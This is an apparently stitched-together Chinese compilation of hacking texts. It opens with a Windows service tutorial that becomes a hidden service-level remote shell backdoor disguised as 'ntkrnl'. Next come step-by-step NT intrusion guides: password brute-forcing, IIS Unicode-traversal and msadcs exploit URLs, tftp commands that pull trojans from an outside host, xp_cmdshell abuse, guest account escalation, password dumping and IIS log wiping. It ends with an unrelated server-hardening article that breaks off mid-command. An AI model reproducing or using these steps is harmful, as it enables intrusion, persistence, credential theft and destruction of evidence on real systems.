Windows下的服务程序都遵循服务控制管理器(SCM)的接口标准，它们会在登录系统时自动运行，甚至在没有用户登录系统的情况下也会正常执行，类似与UNIX系统中的守护进程(daemon)。它们大多是控制台程序，不过也有少数的GUI程序。本文所涉及到的服务程序仅限于Windows2000/XP系统中的一般服务程序，不包含Windows9X。
二> Windows服务简介
服务控制管理器拥有一个在注册表中记录的数据库，包含了所有已安装的服务程序和设备驱动服务程序的相关信息。它允许系统管理员为每个服务自定义安全要求和控制访问权限。Windows服务包括四大部分：服务控制管理器(Service Control Manager)，服务控制程序(Service Control Program)，服务程序(Service Program)和服务配置程序(Service Configuration Program)。
1.服务控制管理器(SCM)
服务控制管理器在系统启动的早期由Winlogon进程启动，可执行文件名是“Admin$\System32\Services.exe”，它是系统中的一个RPC服务器，因此服务配置程序和服务控制程序可以在远程操纵服务。它包括以下几方面的信息：
已安装服务数据库：服务控制管理器在注册表中拥有一个已安装服务的数据库，它在服务控制管理器和程序添加，删除，配置服务程序时使用，在注册表中数据库的位置为：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services。它包括很多子键，每个子键的名字就代表一个对应的服务。数据库中包括：服务类型(私有进程，共享进程)，启动类型(自动运行，由服务控制管理器启动，无效)，错误类型(忽略，常规错误，服务错误，关键错误)，执行文件路径，依赖信息选项，可选用户名与密码。
自动启动服务：系统启动时，服务控制管理器启动所有“自启”服务和相关依赖服务。服务的加载顺序：顺序装载组列表：HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ServiceGroupOrder；指定组列表：HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\GroupOrderList；每个服务所依赖的服务程序。在系统成功引导后会保留一份LKG(Last-Know-Good)的配置信息位于：HKEY_LOCAL_MACHINE\SYSTEM\ControlSetXXX\Services。
因要求而启动服务：用户可以使用服务控制面板程序来启动一项服务。服务控制程序也可以使用StartService来启动服务。服务控制管理器会进行下面的操作：获取帐户信息，登录服务项目，创建服务为悬挂状态，分配登录令牌给进程，允许进程执行。
服务记录列表：每项服务在数据库中都包含了下面的内容：服务名称，开始类型，服务状态(类型，当前状态，接受控制代码，退出代码，等待提示)，依赖服务列表指针。
服务控制管理器句柄：服务控制管理器支持句柄类型访问以下对象：已安装服务数据库，服务程序，数据库的锁开状态。
2.服务控制程序(SCP)
服务控制程序可以执行对服务程序的开启，控制和状态查询功能：
开启服务：如果服务的开启类型为SERVICE_DEMAND_START，就可以用服务控制程序来开始一项服务。在开始服务的初始化阶段服务的当前状态为：SERVICE_START_PENDING，而在初始化完成后的状态就是：SERVICE_RUNNING。
向正在运行的服务发送控制请求：控制请求可以是系统默认的，也可以是用户自定义的。标准控制代码如下：停止服务(SERVICE_CONTROL_STOP)，暂停服务(SERVICE_CONTROL_PAUSE)，恢复已暂停服务(SERVICE_CONTROL_CONTINUE),获得更新信息(SERVICE_CONTROL_INTERROGATE)。
3.服务程序
一个服务程序可能拥有一个或多个服务的执行代码。我们可以创建类型为SERVICE_WIN32_OWN_PROCESS的只拥有一个服务的服务程序。而类型为SERVICE_WIN32_SHARE_PROCESS的服务程序却可以包含多个服务的执行代码。详情参见后面的Windows服务与编程。
4.服务配置程序
编程人员和系统管理员可以使用服务配置程序来更改，查询已安装服务的信息。当然也可以通过注册表函数来访问相关资源。
服务的安装，删除和列举：我们可以使用相关的系统函数来创建，删除服务和查询所有服务的当前状态。
服务配置：系统管理员通过服务配置程序来控制服务的启动类型，显示名称和相关描述信息。 
三> Windows服务与编程
Windows服务编程包括几方面的内容，下面我们将从服务控制程序，服务程序和服务配置程序的角度介绍服务编程相关的内容。
1.服务控制程序
执行服务控制程序的相关函数前，我们需要获得一个服务对象的句柄，方式有两种：由OpenSCManager来获得一台特定主机的服务控制管理器数据库的句柄；使用OpenService或CreateService函数来获得某个服务对象的句柄。
启动服务：要启动一个服务，服务控制程序可以使用StartService来实现。如果服务控制管理器数据库被锁定，那需要等待一定的时间然后再次测试StartService函数。当然也可以使用QueryServiceLockStatus函数来确认数据库的当前状态。在启动成功完成时，那么dwCurrentState参数将会返回SERVICE_RUNNING值。
服务控制请求：服务控制程序使用ControlService函数来发送控制请求到正在运行的服务程序。它会向控制句柄函数发送一个特定的控制命令，可以是系统默认的，也可以是用户自定义的。而且每个服务都会确定自己将会接收的控制命令列表。使用QueryServiceStatus函数时，在返回的dwControlsAccepted参数中表明服务程序将会接收的控制命令。所有的服务都会接受SERVICE_CONTROL_INTERROGATE命令。
2.服务程序
一个服务程序内可以包含一个服务或多个服务的执行代码，但是它们都拥有固定的三个部分：服务main函数，服务ServiceMain函数和服务Control Handler函数。 
服务main函数：服务程序通常是以控制台的方式存在的，所以它们的入口点都是main函数。在服务控制管理器开始一个服务程序时，会等待StartServiceCtrlDispatcher函数的执行。如果服务类型是SERVICE_WIN32_OWN_PROCESS就会立即调用StartServiceCtrlDispatcher函数的执行；如果服务类型是SERVICE_WIN32_SHARE_PROCESS，通常在初始化所有服务之后再调用它。StartServiceCtrlDispatcher函数的参数就是一个SERVICE_TABLE_ENTRY结构，它包含了进程内所有服务的名称和服务入口点。
服务ServiceMain函数：函数ServiceMain是服务的入口点。在服务控制程序请求一个新的服务启动时，服务控制管理器启动一个服务，并发送一个开始请求到控制调度程序，而后控制调度程序创建一个新线程来执行ServiceMain函数。ServiceMain须执行以下的任务：调用RegisterServiceCtrlHandler函数注册一个HandlerEx函数来向服务发送控制请求信息，返回值是服务状态句柄用来向服务控制管理器传送服务状态。初始化后调用SetServiceStatus函数设置服务状态为SERVICE_RUNNING。最后，就是执行服务所要完成的任务。
服务Control Handler函数：每个服务都有一个控制句柄HandlerEx函数。它会在服务进程从服务控制程序接收到一个控制请求时被控制调度程序所调用。无论何时在HandlerEx函数被调用时，都要调用SetServiceStatus函数向服务控制管理器报告它当前的状态。在用户关闭系统时，所有的控制句柄都会调用带有SERVICE_ACCEPT_SHUTDOW控制代码的SetServiceStatus函数来接收NSERVICE_CONTROL_SHUTDOWN控制代码。
3.服务配置程序
服务配置程序可以更改或查询服务的当前配置信息。在调用服务配置函数之前，必须获得一个服务对象的句柄，当然我们可以通过调用OpenSCManager,OpenService或CreateService函数来获得。
创建，删除服务：服务配置程序使用CreateService函数在服务控制管理器的数据库中安装一个新服务，它会提供服务的名称和相关的配置信息并存储在数据库中。服务配置程序则使用DeleteService函数从数据库中删除一个已经安装的服务。
四> 服务级后门技术
在你进入某个系统后，往往会为自己留下一个或多个后门，以便今后的访问。在上传一个后门程序到远程系统上后系统重启之时，总是希望后门仍然存在。那么，将后门程序创建成服务程序应该是个不错的想法，这就是利用了服务程序自动运行的机制，当然在Windows2000的任务管理器里也很难结束一个服务程序的进程。
创建一个后门，它常常会在一个端口监听，以方便我们使用TCP/UDP协议与远程主机建立连接，所以我们首先需要在后门程序里创建一个监听的端口，为了数据传输的稳定与安全，我们可以使用TCP协议。
那么，我们如何才能模拟一个Telnet服务似的后门呢？我想大家都清楚，如果在远程主机上有一个Cmd是我们可以控制的，也就是我们可以在这个Cmd里执行命令，那么就可以实现对远程主机的控制了，至少可以执行各种常规的系统命令。启动一个Cmd程序的方法很多，有WinExec,ShellExecute,CreateProcess等，但只能使用CreateProcess，因为WinExec和ShellExecute它们实在太简单了。在使用CreateProcess时，要用到它的重定向标准输入/输出的选项功能，把在本地主机的输入重定向输入到远程主机的Cmd进程，并且把远程主机Cmd进程的标准输出重定向到本地主机的标准输出。这就需要在后门程序里使用CreatePipe创建两个管道来实现进程间的数据通信(Inter-Process Communication，IPC)。当然，还必须将远程主机上Cmd的标准输入和输出在本地主机之间进行传送，我们选择TCP协议的send和recv函数。在客户结束访问后，还要调用TerminateProcess来结束创建的Cmd进程。
五> 关键函数分析
本文相关程序T-Cmd v1.0是一个服务级的后门程序，适用平台为Windows2000/XP。它可自动为远程/本地主机创建服务级后门，无须使用任何额外的命令，支持本地/远程模式。重启后，程序仍然自动运行，监听端口20540/tcp。
1.自定义数据结构与函数
typedef struct
{
HANDLE hPipe;
//为实现进程间通信而使用的管道；
SOCKET sClient;
//与客户端进行通信时的客户端套接字；
}SESSIONDATA,*PSESSIONDATA;
//重定向Cmd标准输入/输出时使用的数据结构；
typedef struct PROCESSDATA
{
HANDLE hProcess;
//创建Cmd进程时获得的进程句柄；
DWORD dwProcessId;
//创建Cmd进程时获得的进程标识符；
struct PROCESSDATA *next;
//指向下一个数据结构的指针；
}PROCESSDATA,*PPROCESSDATA;
//在客户结束访问或删除服务时为关闭所以的Cmd进程而创建的数据结构；
void WINAPI CmdStart(DWORD,LPTSTR *);
//服务程序中的“ServiceMain”：注册服务控制句柄，创建服务主线程；
void WINAPI CmdControl(DWORD);
//服务程序中的“HandlerEx”：处理接收到的控制命令，删除已创建的Cmd进程；
DWORD WINAPI CmdService(LPVOID);
//服务主线程，创建服务监听端口，在接受客户连接时，创建重定向Cmd标准输入/输出线程；
DWORD WINAPI CmdShell(LPVOID);
//创建管道与Cmd进程，及Cmd的输入/输出线程；
DWORD WINAPI ReadShell(LPVOID);
//重定向Cmd的输出，读取信息后发送到客户端；
DWORD WINAPI WriteShell(LPVOID);
//重定向Cmd的输入，接收客户端的信息输入到Cmd进程；
BOOL ConnectRemote(BOOL,char *,char *,char *);
//如果选择远程模式，则须与远程主机建立连接，注须提供管理员权限的用户名与密码，密码为空时用"NULL"代替；
void InstallCmdService(char *);
//复制传送文件，打开服务控制管理器，创建或打开服务程序；
void RemoveCmdService(char *); 
//删除文件，停止服务后，卸载服务程序；
2.服务程序相关函数
SERVICE_TABLE_ENTRY DispatchTable[] =
{
{"ntkrnl",CmdStart},
//服务程序的名称和入口点；
{NULL ,NULL }
//SERVICE_TABLE_ENTRY结构必须以“NULL”结束；
};
StartServiceCtrlDispatcher(DispatchTable);
//连接服务控制管理器，开始控制调度程序线程；
ServiceStatusHandle=RegisterServiceCtrlHandler("ntkrnl",CmdControl); 
//注册CmdControl函数为“HandlerEx”函数，并初始化；
ServiceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus(ServiceStatusHandle,&ServiceStatus)；
//设置服务的当前状态为SERVICE_RUNNING；
hThread=CreateThread(NULL,0,CmdService,NULL,0,NULL);
//创建服务主线程，实现后门功能；
WaitForSingleObject(hMutex,INFINITE);
//等待互斥量，控制全局变量的同步使用；
TerminateProcess(lpProcessDataHead->hProcess,1);
//终止创建的Cmd进程；
hSearch=FindFirstFile(lpImagePath,&FileData);
//查找系统目录下服务程序的文件是否已经存在；
GetModuleFileName(NULL,lpCurrentPath,MAX_PATH);
//获得当前进程的程序文件名；
CopyFile(lpCurrentPath,lpImagePath,FALSE);
//复制文件到系统目录下；
schSCManager=OpenSCManager(lpHostName,NULL,SC_MANAGER_ALL_ACCESS);
//打开服务控制管理器数据库；
CreateService(schSCManager,"ntkrnl","ntkrnl",SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,SERVICE_ERROR_IGNORE,"ntkrnl.exe",NULL,NULL,NULL,NULL,NULL);
//创建服务，参数包括名称，服务类型，开始类型，错误类型及文件路径等；
schService=OpenService(schSCManager,"ntkrnl",SERVICE_START);
//如果服务已经创建，则打开服务；
StartService(schService,0,NULL);
//启动服务进程；
ControlService(schService,SERVICE_CONTROL_STOP,&RemoveServiceStatus);
//控制服务状态；
DeleteService(schService);
//卸载服务程序；
DeleteFile(lpImagePath);
//删除文件；
3.后门程序相关函数
hMutex=CreateMutex(NULL,FALSE,NULL);
//创建互斥量；
hThread=CreateThread(NULL,0,CmdShell,(LPVOID)&sClient,0,NULL);
//创建处理客户端访问的重定向输入输出线程；
CreatePipe(&hReadPipe,&hReadShell,&saPipe,0);
CreatePipe(&hWriteShell,&hWritePipe,&saPipe,0);
//创建用于进程间通信的输入/输出管道；
CreateProcess(lpImagePath,NULL,NULL,NULL,TRUE,0,NULL,NULL,&lpStartupInfo,&lpProcessInfo);
//创建经重定向输入输出的Cmd进程；
hThread[1]=CreateThread(NULL,0,ReadShell,(LPVOID*)&sdRead,0,&dwSendThreadId);
hThread[2]=CreateThread(NULL,0,WriteShell,(LPVOID *)&sdWrite,0,&dwReavThreadId);
//创建处理Cmd输入输出的线程；
dwResult=WaitformultipleObjects(3,hThread,FALSE,INFINITE);
//等待线程或进程的结束；
ReleaseMutex(hMutex);
//释放互斥量；
PeekNamedPipe(sdRead.hPipe,szBuffer,BUFFER_SIZE,&dwBufferRead,NULL,NULL);
//从管道中复制数据到缓冲区中，但不从管道中移出；
ReadFile(sdRead.hPipe,szBuffer,BUFFER_SIZE,&dwBufferRead,NULL);
//从管道中复制数据到缓冲区中；
WriteFile(sdWrite.hPipe,szBuffer2Write,dwBuffer2Write,&dwBufferWritten,NULL);
//向管道中写入从客户端接收到的数据；
dwErrorCode=WNetAddConnection2(&NetResource,lpPassword,lpUserName,CONNECT_INTERACTIVE);
//与远程主机建立连接；
WNetCancelConnection2(lpIPC,CONNECT_UPDATE_PROFILE,TRUE);
//与远程主机结束连接；



对NT的攻击手段
对NT的攻击手段，这里要用几个软件
我的系统是WIN2000，还有PERL，头发TFTP TURB98，TWWWSCAN0.6，NEWLETMEIN，
NETBUS1。7（木马），MSSQL7 ,netsvc.exe
所有对NT的攻击都是因为管理员的懒惰，可能是懒的改密码，懒的升级，懒得打
补丁，，，，这里我就说说我曾用过的4个比较普遍的大漏洞
1，开了共享，而且ADMINISTRATORS组密码简单要不是空，要不是和用户名1样
对于这样的傻瓜管理员，，攻击变的简单，在WIN2000的命令提示符下
这样输入
c:\>newletmein xxx.xxx.xxx.xxx -all -g
xxx.xxx.xxx.xxx是你要攻击的网站的IP地址
然后等待程序执行完毕，如果发现可用的用户名和密码，程序会告诉你，记住这个
用户名和密码，再这样输入(这里假设用户名为ADMIN。密码也是ADMIN）
c:\>net use \\XXX.XXX.XXX.XXX\IPC$ "ADMIN" /USER:"ADMIN"
程序显示命令完成，接着来
c:\>copy c:\netsvc.exe \\xxx.xxx.xxx.xxx\admin$\system32
程序显示1个文件COPY成功
接着来
c:\>copy c:\ntsrv.exe \\xxx.xxx.xxx.xxx\admin$\system32
程序显示1个文件COPY成功
接着来
c:\>netsvc \\xxx.xxx.xxx.xxx schedule /start
等显示成功，接着来,这里假设对方时间为13:00(这里可以用NET TIME看时间）
c:\>at \\xxx.xxx.xxx.xxx 13:00 ntsrv.exe /port:65432 /nomsg
程序会告诉你这个命令的ID号，等时间一到，用木马连他的机器的65432端口
可以加上自己的密码，和更改端口，目标搞定
2，目标开了WEB服务，IIS有漏洞msadcs.dll漏洞，这个漏洞可以用TWWWSCAN扫描
到，为了确认这个漏洞，你可以在浏览器的网址栏里输入这个文件的具体路径来确认
IE将显示application/x_varg，说明这个漏洞存在，然后在PERL下，进行攻击
C:\Perl\BIN>perl -x msadcs.txt -h xxx.xxx.xxx.xxx
Please type the NT commandline you want to run (cmd /c assumed):\n
cmd /c 一般这里我用TFTP上传我的木马文件，但首先你得先设置好你的TFTP主机
tftp -i 61.137.157.156 get ntsrv.exe c:\winnt\system32\ntsrv.exe
这里61.137.157.156是我的TFTP主机，TFTP目录下有NTSRV。EXE木马
如果程序执行成功，TFTP会显示文件传输的进度，然后再执行PERL，将木马激活
，你再用木马连上对方的机器，搞定
3，目标开了WEB服务，而且有SQL服务，一般SQL服务器开1433端口
如果WEB服务器用ASP等等。。。你如果能看到ASP或者GLOBAL。ASA的原码，
而且把用户名或者密码写在这里，OK，你已经差不多搞定拉
打开SQL SERVER 7。0 在client network uitlity里输入对方IP，通讯选TCP/IP
端口选1433，然后应用确定，再打开query analyzer SERVER选你要攻击的
IP，用户名和密码输入，连接他，等会，连上拉
在上面这样输入
create proc #1 as exec master..xp_cmdshell'dir c:\'
go
exec #1
按F5执行，会显示对方机器的文件目录，然后用TFTP上传你的木马，并且执行，再用木马连接他
搞定（需要注意的是PROC的号要执行1次换1个，单引号间是命令行）
4，目标开了WEB服务，IIS有漏洞，这里要说现在比较普遍的双字节编码漏洞。理论
这里不说，也说不好，照着干就可以拉。发现目标XXX。XXX。XXX。XXX
在浏览器里输入
http://xxx.xxx.xxx.xxx/.idq
显示路径，WEB是在那里
http://xxx.xxx.xxx.xxx/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir
这样我们将得到对方的文件目录
然后这样
http://xxx.xxx.xxx.xxx/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp -i 61.137.157.156 get ntsrv.exe c:\winnt\system32\ntsrv.exe
等文件传完，再这样
http://xxx.xxx.xxx.xxx/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+c:\winnt\system32\ntsrv.exe
木马被启动，用木马连上，搞定，但是权限可能不是管理员，有办法成为管理员
等以后再说吧！可能有的细节和你实践不一样，具体问题具体对待，还有什么以后
再交流吧！
入侵的一些手法
入侵的一些手法(详细教程一)（这篇教程因为是随意之作没进行过整理，所以很希望各位能够看完，说不定在某个地方就能解决你经常思考的问题了）
先用流光(在iv FOR 2000/nt/xp的版本下)
一般我都是用SQL扫描(现在的流光都有IIS/PRONTPAGE扫描了，那就用这个）,然后利用的是iis远程执行命令漏洞，这个漏洞你应该知道一般有这个漏洞就有U漏洞，但是有U漏洞不一定有这个漏洞，所以我一般都扫个2-3万台
（网段）比如111.111.1.1-111.111.100.255
然后就去干别的，运气再不好，也有个好多台。
然后呢？我的手法是这样的
在IIS远程执行命令漏洞下（这个漏洞流光可以连接，其实就是U漏洞的各种类型，也就说你扫到U漏洞了用我以下写的手法一样非常容易入侵一台机器：），打入
copy c:\winnt\system32\cmd.exe c:\inetpub\scripts\treasure.exe（如果是U漏洞在IE上打入:..../scripts/cmd.exe?/c+copy c:\winnt\system32\cmd.exe c:\inetpub\scripts\treasure.exe)
其实在IIS远程执行命令漏洞下我们一般能用到的DOS命令（常用的）
是set查看他的网站结构，dir查看上传情况(记的常用dir c:\xxx/s这个命令）
（此时可以在IE上打入ip/scripts/treasure.exe?/c+set,很有成就感是吗？）
虽然很多时候用SET就能看到网站的WEB目录但是更多的时候还是要用到这个命令
PATH_TRANSLATED=c:\inetpub\wwwroot
这个就是SET后的结果中的一句话
这个就是网站的WEB目录，那如果没这句话呢？没关系用DIR C:\XXX/S这个命令啊
网站上随便找张图点右键，看到图的名字了吧呵呵替换XXX呵呵：）如果C盘下没有？
呵呵试到F盘：）肯定会有的哈哈
SET还可以查看到很多东东呢：）好好去实验吧，比如SCRIPTS目录，我还碰到过
SCRIPTS目录是c:\progra~1\....\masca什么的呢：）这个你多实验肯定会知道的
接着呢我比较喜欢在IE上做事，其实在IIS远程命令执行漏洞上利用是一样的
ip/scripts/treasure.exe?/c+
这里你该明白了，我们权限很小，一般只能在这里用FTP或者TFTP上传：）
tftp的命令为
ip/scripts/treasure.exe?/c+tftp+ip+get+idq.dll+c:\inetpub\scripts\idq.dll
FTP的命令为
ip/scripts/treasure.exe?/c+echo+open+free.tsee.net>bbs.txt (你的FTP站点，在DOS下用FTP命令你就明白我所写了语句了）
ip/scripts/treasure.exe?/c+echo+treasure>>bbs.txt(ftp用户名)
ip/scripts/treasure.exe?/c+echo+123456>>bbs.txt(ftp密码)
ip/scripts/treasure.exe?/c+echo+get+idq.dll>>bbs.txt(idq.dll利用044漏洞入侵的，呵呵直接运行IDQ。DLL亦可以得到个ADMINISTRATOR用户和密码,iisuser,密码是abcd1234.)
直接运行的命令为ip/scripts/treasure.exe?/c+c:\inetpub\scripts\idq.dll(直接运行其他程序也是一样的用法，聪明的人应该现在就看出来了用的全是DOS命令）
ip/scripts/treasure.exe?/c+echo+bye>>bbs.txt
ip/scripts/treasure.exe?/c+ftp+-s:bbs.txt(ftp命令的高级使用了吧呵呵）
注意>是完全替换就是说BBS。TXT原来是存在的用>写就用现在的语句替换了，>>是写第二行第三行，
依次类推
这里要注意的是bbs.txt最后一定要删除，这里留下了你的FTP站点名字和你的用户名和密码
如果你下次还想用的话呵呵最好删除了（给个建议用台肉鸡开个FTP自己建立用户名和密码）
那样最方便了：）用肉鸡做事
然后呢就好办了
ispc ip/scripts/idq.dll
这里要补充的是，既然我们扫的是SQL出来的是IIS漏洞，当然能利用IDQ。DLL了，
其实有时候你扫到弱IPC密码和用户，他没开HTTP或者没用IIS那样的话呵呵，IDQ。DLL用不上了
我们只能上传些木马类的了。
这个是很好的后门，我最喜欢用这个了
别忘记连接后要按三次回车算一次的。
接着一般以我的手法是激活guest
net user guest /active:yes
net user guest 123456
net localgroup administrators guest /add
然后呢用ipc连接传个showpass到他的system32目录下呵呵肯定用的上的
net use \\ip\ipc$ "800214520" /user:"guest"
copy showpass.exe \\ip\admin$\system32\showpass.exe
net use \\ip\ipc$ /delete(呵呵习惯要好)

这里要说明的是有兴趣的朋友亦可以上传IRC木马和csrss.exe（简短说明: 本软件可以在Nt4.0/Win2000的系统上面添加Administrators权限账号，由于采用时间添加方式，以任务方式添加账号，在中午12点整时自动添加账号，13点时删除账号，18点时添加账号，19点时删除账号，23点时添加账号，0点删除账号，由于以上几个时间段都是网管最容易忽视的时间，网管根本不会想到你会拥有Administrators权限
账号，从而使得你的劳动结果不会被破坏，:)
下载地址为：http://www.sandflee.net/down/show.asp?id=62&down=1
IRC木马不介绍的原因是太可怕，亦是我认为唯一算的上是好木马
说到开后门了
其实在上步的时候有兴趣的朋友可以上传ASP后门（不推荐觉的权限不够大）
这里我们用的是remotenc
remotenc没有日志记录（爽吗？）呵呵
remotenc对付administrator密码为空的时候输入""（嘿嘿）
remotenc的说明呵呵详细吧
RemoteNC <IP> <Username> <Password> <Starting Mode>
<Service Name> <Description Name>
<Listen Port> <Control Password> [/OVERWRITE]
remotenc x.x.x.x 用户 密码 (LocalSystem or RunAsUser 任选一下) 服务名 服务描述 监听端口 控制密码 [是否覆盖原有服务]
这里介绍一下我朋友说的隐藏REMOTENC的方法没用过（呵呵不是经验之谈了懒啊没办法)
remotenc 192.***.***.*** Administrator 123456 localsystem Server Server 7 123456(创建remotenc后门)
telnet后门后
dir server.exe
attriv server.exe +h +r
dir server.exe
呵呵用的是DOS命令（很实用啊)
别人不能覆盖你的后门了（因为是只读)
当然了有兴趣的可以装个Sniffer
还有的是remotenc的补充说明（可以本地安装）方便吧：）
可以TELNET后用SHOWPASS（这就是为什么放在system32下的原因了）
SHOWPASS的实用，他本地机器用ADMINISTRATOR登陆后呵呵：）我们SHOWPASS肯定能得到
ADMINISTRATOR的密码哈哈爽吗？
很多时候这个密码在SQL和FTP还有PCANYWHERE里面都是通用的啊
有个软件要注意
dwrcc这里要说明的是这个软件不推荐，但是确实很实用（只要能建立IPC连接就能用这个了，大多数情况）主要这个是图形界面的。但是如果你机器突然之间下面多了个图标或者有时候鼠标移动有些问题，呵呵你会怎么想？ 介绍一下我关于使用SHOWPASS的经验；）
你已经会ispc提升权限，idq.dll(也可以当作后门使用),会出现提示符
c:\winnt\system32\>showpass(在这里输入一样ok,前提当然已经用copy showpass.exe \\ip\admin$\system32,传到这个目录了)
用remotenc开了后门以后telnet上去输入showpass(COPY是必须的)
成功率相当的高，前提是他那台机器本地用administrator已经登陆，好象WIN2000/NT 把管理员的密码登陆后存放在内存里了还是明文的..
知道管理员的密码不就又是个后门了，更多的是管理员的密码==pcanywhere的密码=sql的密码哈哈哈哈
showpass的原理(meteor写的我没看懂)
GetWindowText()
and TextOut() window API's
REMOTENC本地安装IP改成127.0.0.1
还有的是REMOTENC有两种模式可以安装推荐第一种：）90%的机器都能安装成功的（呵呵没装个好的防火墙）
现在的经验是不需要这个也可以IDQ.DLL亦是个好后门不会被杀
还有你REMOTENC装好后就把GUEST 停用吧：)保险点
呵呵别忘记删除日志（这个不是我的习惯，不要跟我学习）
cleaniislog.exe . 你的ip //删除所有日至中有你的ip的纪录。
cleaniislog.exe C:\winnt\system32\logfiles\w3svc1\ex020208.log 你的ip //指定删除一个日志文件中你的ip纪录。
p.s: 不一定是w3svc1，有可能是w3svc2 ,vc3等， ex020208 为02年02月08号的日志，即当天日志。
如果不是~
运行：cleaniislog.exe /? 看看帮助。 （这个也不是我写的）
随便看看吧，我的建议是手动改日志
文件目录（唉呀你没看到上面的语句啊）
关于ispc和IDQ.DLL呵呵前面介绍了这里就不说了，反正就这么用(idq.dll可以改成数个名字亦可以使用)
还要推荐个PIPEUPADMIN这个软件很多朋友问我有GUEST用户能上传文件该怎么办，
好简单啊：)用这个软件啊上传后运行就可以了啊：)呵呵强制提升权限。
还有啊pwdump3这个软件是抓回SAM挡的：)（有用户名和密码就可以抓回了）LC3破好了
42天内（不管密码多复杂没有破不了的，我讨厌暴力破解我是个没耐心的人）
刚想起来了朋友问我怎么看主页很简单啊，用
ip/scripts/treasure.exe?/c+type+c:\xxx\xxx.htm
嘿嘿这个是查看文件的目录，你试一下效果好吗？呵呵其实一般找到WEB目录的路径我就不信找不到他的主页
这里要补充的是。其实IIS远程执行命令漏洞就是U漏洞的几个类型从A-F：（我好象也刚领悟）
所以U漏洞也一样利用我写的手法,成功率非常之高。国内很多日10万IP的网站依然有此漏洞。为什么我很多时间不深入探讨PRINTER溢出，PRINTER溢出针对的是没打SP2的：（那没打SP2的肯定有U漏洞了。多思考你会比别人进步的更快。
这里还要提供一个入侵的新思路如果我用U漏洞或者用FTP能访问他的目录或者其他的方法能访问他的目录并且有删除文件的功能。试试删除了他的winnt/repair和winnt/config下的SAM文件。（2000为SAM，NT为SAM._ ）
这篇好像是CRACKER入侵啊。
Web服务器的安全和攻击防范
分析一下最近几个月信用卡号码被盗和网站被黑所显示的种种安全问题，可以很清楚地看出，许多Web应用都是凑合着运行，很少有人关注其安全问题或作出安全规划。那么，造成服务器缺乏安全保障的常见原因有哪些？如何防范这些不安全因素？作为客户或者最终用户，如何才能信任某个服务器符合了基本的安全需求？ 
　　 对于以往安全事故的分析表明，大多数安全问题都属于下面三种类型之一： 
服务器向公众提供了不应该提供的服务。 
服务器把本应私有的数据放到了可公开访问的区域。 
服务器信赖了来自不可信赖数据源的数据。 
　　 提供不应该提供的服务 
　　 显然，许多服务器管理员从来没有从另一个角度来看看他们的服务器，例如使用端口扫描程序。如果他们曾经这样做了，就不会在自己的系统上运行那么多的服务，而这些服务原本无需在正式提供Web服务的机器上运行，或者这些服务原本无需面向公众开放。 
　　 与这种错误经常相伴的是，为了进行维护而运行某些不安全的、可用于窃取信息的协议。例如，有些Web服务器常常为了收集订单而提供POP3服务，或者为了上载新的页面内容而提供FTP服务甚至数据库服务。在某些地方这些协议可能提供安全认证（比如APOP）甚至安全传输（比如POP或者FTP的SSL版本），但更多的时候，人们使用的是这些协议的非安全版本。有些协议，比如msql数据库服务，则几乎没有提供任何验证机制。 
　　 从公司外面访问自己的网络，完整地检测、模拟攻击自己的网站看看会发生些什么，这对于Web管理者来说是一个很好的建议。有些服务在机器安装之后的默认配置中已经启动，或者由于安装以及初始设置的需要而启动了某些服务，这些服务可能还没有正确地关闭。例如，有些系统提供的Web服务器会在非标准的端口上提供编程示范以及系统手册，它们往往包含错误的程序代码并成为安全隐患所在。正式运行的、可从Internet访问的Web服务器不应该运行这些服务，请务必关闭这些服务。 
　　 另外一种攻击者经常利用的资源是SNMP协议（简单网络管理协议，Simple Network Management Protocol)。它可能为攻击者提供有关系统和网络布局的极其详细和宝贵的信息。由于SNMP是一种UDP服务，比较简单的安全检查不会发现它。 
　　 当然，需要保护的不仅仅是Web服务器，在防火墙外面的所有其他机器更必须遵从同样的安全标准。
nmap可以从http://www.insecure.org/nmap/获得。
# nmap -sS -T Agressive -p 1-10000 www.example.server | grep open
Port State Protocol Service
21 open tcp ftp
22 open tcp ssh
25 open tcp smtp
80 open tcp http
111 open tcp sunrpc
119 open tcp nntp
3306 open tcp mysql
4333 open tcp msql
　　 www.example.server作为WWW和FTP服务器使用。此外，该服务器还提供了ssh、smtp、sunrpc、nntp、mysql和msql服务。 
　　 在这些服务中，ssh是一种带有完善加密和认证机制的协议，如果服务器上运行的ssh是最新版本，那么使用它应该是安全的。 
　　 http、ftp、smtp和nntp是www.example.server服务器实际提供的服务，这些服务是必须运行的。只要FTP只用于匿名服务，网络上也不会因此出现以明文形式传送的密码。所有其他文件传输都应该用scp工具和ssh协议完成。 
　　 sunrpc、mysql和msql服务没有必要从防火墙外面的机器访问，而且也没有必要被所有的IP地址访问。这些端口应该用防火墙或者包过滤器阻隔。 
　　 对于所有向公众开放的服务，你应该密切关注其程序的最新版本和安全信息，应该做好一旦发现与这些程序有关的安全问题就立即升级软件的准备。例如，某些版本的ssh会出现问题，在一些特殊的情形下服务器可能被骗并以非加密方式运行。对于有些FTP服务器、早期的sendmail以及某些版本的INN，已知的安全问题包括缓存溢出等。 
　　 有些时候端口扫描程序找到了一个打开的端口，但我们却不知道哪一个程序在操作这个端口，此时就要使用lsof之类的工具了。执行命令“lsof -P -n -i”即可显示出所有本地打开的端口以及操作这些端口的程序。 
# lsof -P -n -i
COMMAND PID USER FD TYPE DEVICE SIZE NODE NAME
xfstt 46 root 4u IPv4 30 TCP *:7100 (LISTEN)
httpd 199 root 19u IPv4 99 TCP 192.168.1.12:80 (LISTEN)
...
smbd 11741 root 5u IPv4 28694 UDP 127.0.0.1:1180
smbd 11741 root 6u IPv4 28689 
TCP 192.168.1.3:139-< 192.168.1.2:1044 (ESTABLISHED)
　　 增加额外的参数就可以扫描指定的协议和端口： 
# lsof -P -n -i tcp:139
COMMAND PID USER FD TYPE DEVICE SIZE NODE NAME
smbd 276 root 5u IPv4 175 TCP *:139 (LISTEN)
smbd 11741 root 6u IPv4 28689 
TCP 192.168.1.3:139-< 192.168.1.2:1044 (ESTABLISHED)
运行nmap搜索整个网络可以列出域之内所有已知服务器。另外，你还可以查看DNS，看看服务器管理员为这个域所设置的内容。 
　　 再使用前面的example.server域： 
# nslookup
< set type=ns
< www.example.server.
Server: ns.provider.net
